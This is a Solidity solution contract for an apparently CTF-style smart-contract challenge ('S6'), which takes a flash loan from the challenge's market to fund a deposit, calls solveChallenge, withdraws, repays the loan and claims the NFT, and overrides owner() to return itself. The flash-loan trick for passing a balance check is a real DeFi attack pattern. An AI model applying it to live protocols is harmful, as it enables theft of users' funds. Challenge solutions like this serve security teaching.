// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { ERC721Holder } from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import { S6 } from "../challenges/S6/S6.sol";
import { S6Token } from "../../src/challenges/S6/S6Token.sol";
import { S6Market } from "../../src/challenges/S6/S6Market.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract Solution6 is ERC721Holder {
    using SafeERC20 for S6Token;

    error Solution6__SolveFailed();
    error Solution6__IncorrectOwnedTokenId();
    error Solution6__ZeroAddressNotAllowed();

    S6 public immutable i_challenge;
    S6Token public immutable i_token;
    S6Market public immutable i_market;
    IERC721 public immutable i_nft;

    constructor(S6 _challenge, IERC721 _nft) {
        i_challenge = (_challenge);
        i_nft = _nft;

        address _getToken = i_challenge.getToken();
        address _getMarket = i_challenge.getMarket();
        i_token = S6Token(_getToken);
        i_market = S6Market(_getMarket);
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function solve() external {
        // init flashloan, borrow the nft cost
        i_market.flashLoan(i_challenge.S6_NFT_COST());
    }

    /// @dev triggered while in 'i_market.flashloan()' context
    /// @dev while in flashloan, this function will execute the entire logic to solve the challenge
    function execute() external payable {
        uint256 _loanAmount = i_challenge.S6_NFT_COST();
        // allowances
        IERC20(i_token).approve(address(i_challenge), _loanAmount);
        // deposit loan in order to solve
        i_challenge.depositMoney(_loanAmount);
        // solve challenge, get the nft
        i_challenge.solveChallenge("thecil_eth");
        // withdraw loan after solve
        i_challenge.withdrawMoney();
        // transfer loan back to market, repay the loan
        i_token.safeTransfer(address(i_market), _loanAmount);
    }

    function withdrawNft(uint256 _tokenId) external {
        if (i_nft.ownerOf(_tokenId) != address(this)) {
            revert Solution6__IncorrectOwnedTokenId();
        }
        i_nft.safeTransferFrom(address(this), msg.sender, _tokenId, "");
    }
}
